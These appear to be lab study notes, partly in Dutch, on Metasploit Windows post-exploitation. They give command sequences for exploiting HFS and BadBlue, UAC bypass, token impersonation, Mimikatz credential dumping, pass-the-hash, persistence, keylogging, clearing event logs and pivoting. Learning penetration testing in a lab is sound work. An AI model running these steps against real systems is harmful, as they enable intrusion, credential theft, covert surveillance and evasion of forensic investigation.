- MSF provides us with post exploitation modules 
![[Pasted image 20230828081111.png]]

#### the basics - post exploitation modules 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip `
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
6) Meterpreter session 
	1) `sysinfo` 
	2) `getuid`
	3) `help` a meterpreter session on windows gives you more options
	4) `getsystem` can be used to elevate privileges 
	5) `show_mount` will display drives 
	6) `ps` 
	7) `migrate 2212` (you can migrate to upgrade your meterpreter session to x64 )
	8) `cd C:\\` and  `dir` 
7) upgrade the architecture:  x86 Meterpreter sessions are used on 32-bit systems and offer limited access to system resources, while x64 Meterpreter sessions are used on 64-bit systems and provide greater access to resources and system components.  
	- `search migrate`
	- `use post/windows/manage/migrate` (create new process and migrate to it)
	- `set session 1 `


**Target and Payload Mismatch:** The architecture of the target system (x64) doesn't match the architecture of the Meterpreter payload (x86/windows). This means that the payload you used to establish the Meterpreter session was designed for 32-bit Windows systems (x86), but it was executed on a 64-bit Windows system (x64). This can lead to compatibility issues because 32-bit payloads might not work properly or have limited functionality on 64-bit systems.



##### post exploitation modules for windows: 
- `post/windows/gather/win_privs` will enumerate the priviliges of current user we have access to.  
	1) set session  

- `post/windows/gather/enum_logged_on_users` allows us to see what users are currently logged on 
	1) set session  

- `post/windows/gather/checkvm` will tell you if the target system is a virtual machine. If you find out that you are on a virtual machine than you can look into exploit modules to break out of the virtual machine and gain access to host operating system that is hosting the virtual machine. 
	- set session

- `post/windows/gather/enum_applications` will tell us what programs are installed on target system (you can check if the applications are vulnerable - if they are you can use that to elevate your priviliges )

- `loot`  will show you were the results of the modules run is stored 

- `post/windows/gather/enum_av_ecluded`  what folders are not scanned by anti-virus. This is handy because in these folders you can store your exploit code and payloads that you want to transfer to the target and execute on disk without being caught 

-  `post/windows/gather/enum_computers` enumerate computers that are part of the domain that the target is also part of

-  `post/windows/gather/enum_patces`  enumerate installed patches on target system
	- if this does not work: go into session -> `shell` this will give you command prompt -> `systeminfo`
	
- `post/windows/gather/enum_shares` enumerate shares 


-  `post/windows/manage/enabled_rdp` enable rdp on target - it will tell you if rdp is already enabled. 


### Windows Privilege Escalations: Bypassing UAC 

- UAC is a Windows security feature introduced in Windows vista that is used to prevent unauthorized changes from being made to the operating system 
![[Pasted image 20230828134513.png]]
- UAC is used to ensure that changes to the operating system require approval from administrator.
- We can utilize the "windows Escalate UAC Protection Bypass (in Memory Injection)" module to bypass UAC by utilizing the trusted publisher certificate through process injection. it will spawn a second shell that has the UAC flag turned off 
- need 64 bit meterpreter session (set payload)
- We are going to bypass UAC using the Metasploit local exploit module. â€œThis module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process.

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
	1) set the payload to the 64-bit meterpreter payload because that is what will be required in order to successfully bypass UAC and elevate our priviliges: `set payload windows/x64/meterpreter/reverse_tcp`
6) `sysinfo`  `getuid` (admin not the same as administrator)
7) Try elevate priviliges: `getsystem`
	1) migrate to another process such as explorer.exe) and try the above command again 
8) what are the priviliges assigned to current user: `getprivs`
9) find out to which group users belongs: 
	1) open shell session: `shell` 
	2) list all user accounts that exist on the local computer: ` net users` 
	3) enumerate users part of group administrators: `net localgroup administrators `
	            if admin is part of administrator group than that means that de admin account can make changes to operating system and do administrative tasks. 
	4) terminate this shell 
10) put meterpreter session in the background
11) bypass UAC:
	1) `use exploit/windows/local/bypassuac_injection `
	2) `set payload windows/x64/meterpreter/reverse_tcp` 
	3) `set TARGET 1` 
	4)  set session` id 
	5) `set` `lport` 
	6) when error:` set TARGET Windows x64 `
	7) `getuid` when you see your privileges are not elevated (you till admin) than use command: `getsystem`. The `getsystem` command in the beginning did not work due to UAC but now that UAC is disabled the command `getsystem` will be able to elevate your priviliges. 
11) migrate to Lsass.exe process 
12) `hashdump` to get the hashes (ntlm hash is 4th field)

### Windows Privilege Escalation: Token Impersonation with Incognito 

- Windows access tokens are a core element of the authentication process on Windows and are created by the Local Security Authority Subsystem Service (LSASS) 
- A windows access token is responsible for identifying and describing the security context of a process or thread running on a system. Simply put an access token can be thought of as a temporary key akin to a web cookie that provides users with access to a system or network resource without having to provide credentials each time a process is started or a system resource is accessed 
- Access tokens are generated by the winlogon.exe process every time a user authenticates successfully and includes the identify and privileges of the user account associated with the thread or process. This token is then attached to the userinit.exe process, after which all child processes started by a user will inherit a copy of the access token from their creator and will run under the privileges of the same access token. 

Een **Windows-toegangstoken** is als een **tijdelijke sleutel** die de beveiligingscontext van een process of thread op een systeem identificeert en beschrijft. Vergelijk het met een webcookie dat gebruikers toegang geeft tot een systeem of netwerkbron zonder telkens inloggegevens te hoeven opgeven wanneer een process wordt gestart of een systeembron wordt benaderd. 

Zonder Windows toegang tokens zou je bij elk programma (met permissions and privileges) je wachtwoord moeten invoeren. 

Toegangstokens worden gegenereerd door het process *winlogon.exe* telkens wanneer een gebruiker succesvol inlogt. *Ze bevatten de identiteit en rechten van het gebruikersaccount dat aan de thread of het process is gekoppeld.* Dit token wordt vervolgens gekoppeld aan het process *userinit.exe*. Alle child processe die door een gebruiker worden gestart, erven een kopie van het toegangstoken van hun parent process en worden uitgevoerd met dezelfde rechten als dat toegangstoken. Dit maakt het mogelijk om soepel met systeembronnen om te gaan zonder voortdurend inloggegevens te hoeven verstrekken.

#####  How are they sorted? 

- Windows access tokens are categorized based on the varying security levels assigned to them. These security levels are used to determine the privileges that are assigned to a specific token
- An access token will typically be assigned one of the following security levels: 
	- **impersonate-level tokens** are created as a direct result of a **non-interactive login** on Windows, typically through specific system services or domain logons. 
		- Een niet-interactieve aanmelding gebeurt meestal automatisch, zonder dat een gebruiker fysieke interactie heeft met het systeem. Dit kan gebeuren via systeemdiensten, geplande taken of netwerktoegang.

	- **Delegate-level tokens** are typically created through an **interactive login** on Windows primarily though a traditional login or through remote access protocols such as RDP 
		- Bij een interactieve aanmelding voert een gebruiker rechtstreeks informatie in om toegang te krijgen tot een systeem, zoals een gebruikersnaam en wachtwoord		  
- Impersonate-level tokens can be used to impersonate a token on the local system and not on any external systems 
- Delegate-level tokens pose the largest threat as they can be used to impersonate tokens on any system. 

Impersonate-level tokens worden meestal aangemaakt als gevolg van een **niet-interactieve aanmelding** op Windows, meestal via specifieke systeemdiensten of domeinaanmeldingen. Stel je voor dat dit een soort "tijdelijk pasje" is dat je toegang geeft tot bepaalde ruimtes binnen een gebouw, maar alleen binnen dat gebouw zelf.

Aan de andere kant worden Delegate-level tokens typisch gemaakt bij een **interactieve aanmelding** op Windows, zoals een traditionele aanmelding of via externe toegangsprotocollen zoals RDP (Remote Desktop Protocol). Deze tokens zijn als een krachtiger pasje waarmee je niet alleen toegang hebt tot ruimtes binnen het ene gebouw, maar ook tot ruimtes in andere gebouwen.

Dus, het belangrijkste verschil is dat Impersonate-level tokens alleen toegang geven tot lokale resources op hetzelfde systeem, terwijl Delegate-level tokens gevaarlijker zijn omdat ze toegang kunnen geven tot resources op andere systemen, waardoor ze een potentieel groter risico vormen


##### Hoe exploiten?

- The process of impersonating access tokens to elevate privilege's on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available 
  
- the following are the privileges that are required for a successful impersonation attack: 
	- **SeAssignPrimaryToken** ----> this allows a user to impersonate tokens 
	- **SeCreateToken**: ----> this allows a user to create an arbitrary token with administrative privileges 
	- **SelmpersonatePrivilege** ---> this allows a user to create a process under the security context of another user typically with administrative privileges 

##### The incognito module 

- the incognito is a built-in meterpreter module that was originally a standalone application that allows you to impersonate user tokens after successful exploitation
- we can use the incognito module to display a list of available tokens that we can impersonate 

--

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
	1) set the payload to the 64-bit meterpreter payload because that is what will be required in order to successfully bypass UAC and elevate our priviliges: `set payload windows/x64/meterpreter/reverse_tcp`
	2) target uri is the root of the webserver (check by visiting the ip)
6) `sysinfo`  `getuid` (admin not the same as administrator)

	NT AUTHORITY\\LOCAL SERVICE is different from NT AUTHORITY\\ SYSTEM 
	`NT AUTHORITY\LOCAL SERVICE` is a Windows account with lower privileges, typically used for running system services with limited access. It means we have privliges associated with local service account. The reason you have this is bc you exploited a service (e.g. rejetto httpfileserver service )
	`NT AUTHORITY\SYSTEM` is a highly privileged account with full control over the system, used for critical system-level task

7) `getprivs`
   ![[Pasted image 20230829114819.png]]
   you need at least one of the following priviliges to do token impersonation: *SeAssignPrimaryToken, SeCreateToken, SelmpersonatePrivilege*

8) verify if you have administrative privileges: 
	1) you can test your privileges with `hashdump` because it requires administrative privileges.  
	2) Try to navigate to administrators user directory:` cd C:\\ cd Users cd Administrators `
9) utilize the incognito module: `load incognito` 
10) `list_tokens -u ` 
	1) impersonate the administrator delegation token: `impersonate_token "ATTACKDEFENSE\ADMINISTRATOR"`   (tussen haakjes de delegation token plakken)
11) `getuid` (now you have the privileges of the administrator )
12) migrate to a different process because the current process we are operating still has the access token that is associated with the NT LOCAL SERVICE account: 
	1) `ps` 
	2) `migrate` *`processid`* 
13) `hashdump` 
14) `cd C:\\ `


### Dumping hashes with Mimikatz 

- Mimikatz is a windows post exploitation tool and it allows for extraction of plaintext credentials from memory, password hashes from local SAM databases and more 
- The SAM (Security Account Manager) database, is a database file on Windows systems that stores users passwords and can be used to authenticate users both locally and remotely 
- we can utilize the pre-built mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension kiwi 
- **kiwi** allows us to dynamically execute mimikatz on the target system without touching the disk 
	- Mimikatz uit te voeren op het doelsysteem zonder gegevens op de harde schijf van dat systeem te wijzigen of achter te laten. Dit is een belangrijk aspect , omdat het helpt bij stealthy of onopvallende activiteiten op het doelsysteem.
	- Normaal gesproken kan het uitvoeren van een tool zoals Mimikatz op een systeem sporen achterlaten, zoals logboekvermeldingen of tijdelijke bestanden op de harde schijf. Deze sporen kunnen worden opgemerkt door beveiligingssoftware of systeembeheerders, waardoor de activiteit verdacht wordt.
	-  "zonder de harde schijf aan te raken," suggereert uitvoering van Mimikatz op een manier die geen sporen achterlaat op de schijf van het doelsysteem. Dit kan gedaan worden door de tool alleen in het geheugen van het systeem uit te voeren, zonder bestanden op de harde schijf op te slaan. Het doel is om zo min mogelijk detecteerbaar te zijn. 

Do things dynamically and in memory as much as possible to stay stealthy 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) Badblue http 2.7 is vulnerable to buffer overflow attack: `search Badblue`
6) `use exploit/windows/http/badblue_passthru`
	1) specify exploit target (options), look at the options: `set target ` select the right target
7) local system enumeration: 
	1) `sysinfo` 
	2) `getuid`   (if our payload does not match with architecture of the system -> migrate)
		1) migrate to lsass.exe -> look for the process id of lsass: `pgrep lsass `
8) lets use mimikatz: kiwi module: 
	1) `load` `kiwi` 
	2) `help` 
	3) `creds_all ` 
	4) dump SAM: `lsa_dump_sam `
	5) dump lsa secrets: `lsa_dump_secrets`     (syskey)


**How to transfer the mimikatz binary on target system manually ( NOT STEALTHY)**
1) upload the file to target system `upload /usr/share/windows-resources/mimikatz/x64/mimiatz.exe`
2) execute the mimikatz file: 
	1) `shell` 
	2) `.\mimikatz.exe` 
	3) make sure you have the required privileges to dump the passwords: `privilege::debug `
	4) try to find cleartext passwords: `sekurlsa::logonpasswords`
	5) dump SAM database: `lsadump::sam `



### Pass-the-Hash With PSExec 

- Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing the to authenticate with the target legitimately 
- we can use the PsExec module to legitimately authenticate with the target system via SMB 
- This technique allows us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation


1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) Badblue is vulnerable: `use exploit/windows/http/badblue_passthru`
	1) specify exploit target (options), look at the options: `set target ` select the right target
7) local system enumeration: 
	1) `sysinfo` 
	2) `getuid`   (if our payload does not match with architecture of the system -> migrate)
		1) migrate to lsass.exe -> look for the process id of lsass: `pgrep lsass `
8) print hashes: `hashdump`  (copy all the hashes and put them in text file)
9) `exit` from meterpreter session 

Use psexec

1) `search psexec` 
2) `use exploit/windows/smb/psexec `
	1) default payload is 32 bit meterpreter payload, change this because the target system is 64 bit operating system: `set payload windows x64`
	2) show options 
	3) set credentials: 
		2) `set SMBPass `{paste the hash}
		3) `set SMBUser Administrator` 
3) `getuid`  `sysinfo` 



### Establishing Persistence on Windows 

- Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access 
- **Gaining an initial foothold is not enough, you need to setup and maintain persistent access to your target** 
- We can utilize various post exploitation persistence modules to ensure that we always have access to the target system 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip 
5) HttpFileServer httpd 2.3 is vulnerable: ` search rejetto ` and `use exploit/windows/http/rejetto_hfs_exec `
	1) set the payload to the 64-bit meterpreter payload: `set payload windows/x64/meterpreter/reverse_tcp`
	2) target Uri is the root of the webserver (check by visiting the ip)
6) `sysinfo`  `getuid` 
7) ensure that we can always get access to the target system without having to exploit the service every time (there is a chance that the service will be patched/disabled). Put current session in the background 
	1) `search platform:windows persistence`
	2) `use exploit/windows/local/persistence_service` this module will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
		1) `set payload windows/meterpreter/reserver_tcp`
		2) `set session 1 `
		3) `run` 
	3) **terminate** all open sessions
8) we make a way to get back into target system:
	1) `use multi/handler` 
	2) `set payload windows/meterpreter/reverse_tcp` 
	3) `set` `lhost` (use same port as set in persistence module)
	4) as long as you have a listener that is listening for connection from target you will be able to receive a connection. 


### Enabling RDP 
- RDP is remote access protocol developed by Microsoft and is used to remotely connect and interact with Windows system 
- RDP uses TCP port 3389 by default 
- RDP is disabled by default, we can use a MSF module to enable rdp on the Windows target and consequently utilize RDP to remotely access to the target system. 
- RDP authentication requires a legitimate user account on the target system as well as the users password in clear-text 

1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip 
4) `db_nmap -sS -sV -O ip  
5) Badblue is vulnerable: `use exploit/windows/http/badblue_passthru`
	1) specify exploit target (options), look at the options: `set target ` select the right target
7) local system enumeration: 
	1) `sysinfo` 
	2) `getuid`
8) enable RDP on target system (put the current session in the background)
	1) `use post/windows/manage/enble_rdp`
	2) `set session 1 
	3) `run` 

How to enable rdp for linux system? 
We need legitimate credentials, get back to the previous session and start a shell because we need to change the password of the compromised account so we can use the password, this is not ideal because it is easy to find out you have been compromised: 
		- `shell` 
		- `net users`
		- change the password of the user followed by the new password: `net user administrator hacker_1234`
		- terminate the channel 
- `xfreerdp /u:administartor /p:hacker_1234 /v:targetip ` 

###  Windows Keylogging 

- keylogging is process of recording the keystrokes entered on a target system
- this is not only limited to post exploitation (e.g. usb that capture keystrokes)
- Meterpreter on windows system provides us with the ability the capture the keystrokes entered on a target system and download them back to our local system 


1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip  
4) `db_nmap -sS -sV -O ip  
5) Badblue is vulnerable: `use exploit/windows/http/badblue_passthru`
	1) specify exploit target (options), look at the options: `set target ` select the right target
6) local system enumeration: 
	1) `sysinfo` 
	2) `getuid`
7) the keylogging module works best when its done on explorer process so migrate to that process first: `pgrep explorer.exe` `migrate`
8) `help`  (find the keystrokes commands)
9) in meterpreter session:` keyscan_start` 
10) to see the keystrokes: `keyscan_dump`
11) to stop: `keyscan_stop`





- Create a file on the desktop which contains the text "You have been Hacked"
	- to create a file first open a new shell within meterpreter: 
		- shell 
		- ECHO "tekst" > filename.txt 
		 ![[Pasted image 20230829221436.png]]

- From the Metasploit session, open the file in notepad on the target machine.
  ![[Pasted image 20230829221104.png]]
or type filename 

![[Pasted image 20230829221949.png]]


### Clearing Windows Event logs 

What are windows event logs? 

- The windows OS stores all actions performed on the system and stored them in the Windows Event log
- Event logs are categorized based on the type of events they store: 
	- **Application logs**: Stores application/program events like startups crashes 
	- **System log**: Stores system events like startups and reboots. 
	- **Security logs**: stores security events like password changes, authentication failures 
- Event logs can be accessed via the Event Viewer on Windows 
- The event logs are the first stop for any forensic investigator after a compromise has been detected. It is therefore important to clear your tracks after you are done with your assessment. 


1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip  
4) `db_nmap -sS -sV -O ip  
5) Badblue is vulnerable for buffer overflow: `use exploit/windows/http/badblue_passthru`
	1) specify exploit target (options), look at the options: `set target ` select the right target
6) local system enumeration: 
	1) `sysinfo` 
	2) `getuid`
7) meterpreter command  used to clear all Windows event logs on a target system: `clearev`  
8) To remove a malicious payload you uploaded to the target use: `rm [name of file]`


##  Pivoting 
- Pivoting is a post exploitation technique that involves utilizing a compromised host to attack other systems on the compromised hosts private internal network. 
- After gaining access to one host we can use the compromised host to exploit other hosts on the same internal network to which we could not access previously 
- Meterpreter provides us with the ability to add a network route to the internal networks subnet and consequently scan and exploit other systems on the network. 

![[Pasted image 20230830113615.png]]
We can ping victim 1 but not victim 2 


1) `service postgresql start && msfconsole` 
2) create new `workspace` 
3) `setg rhost` ip  
4) `db_nmap -sS -sV -O ip  
5) Badblue is vulnerable for buffer overflow: `use exploit/windows/http/badblue_passthru`
	1) specify exploit target (options), look at the options: `set target ` select the right target
	2) set rhosts to victim 1 ip 
6) local system enumeration: 
	1) `sysinfo` 
	2) `getuid`
7) Utilize the access to victim 1 to gain access to victim 2: 
	1) `ipconfig` will list the interfaces available to us, victim 2 is part of same subnet that victim 1 is. 
	2) add a route in meterpreter to network:` run autoroute -s ip/20 '
	   (the route is only applicable for msfconsole, you still cannot visit the second victim)
8) put the meterpreter session to the background
	1) rename the session 1 to victim-1: `sessions -n victim-1 -i 1 `
9) scan open ports on target system: `use auxiliary/scanner/portscan/tcp`
10) set RHOSTS (ip of victim 2)
12) perform port forwarding (we cannot directly scan the victim 2)
	1) sessions 1 
	2) Forward port 80 from victim 2 to our local port: `portfwd add -l 1234 -p 80 victim_2_ip` 
	3) put session 1 in the background
13)  `db_nmap -sS -sV -O -p 1234 localhost'
	   we use port 1234 because that is the port we specified in the port forwarding command,  and the traffic from port 80 will be forwarded to our local port 1234. we add localhost because we are using our own ip. 
14) we see that victim 2 is using vulnerable badblue http: `use exploit/windows/http/badblue_passthru` 
	1) `set payload windows/meterpreter/bind_tcp `
	2) `set rhosts victim2 `
	3) `set lport 4433 `
	4) `run` 
15) `sysinfo`  put session two in the background and change the name of the session: 
	1) `sessions -n victim-2 -i 2 `
































































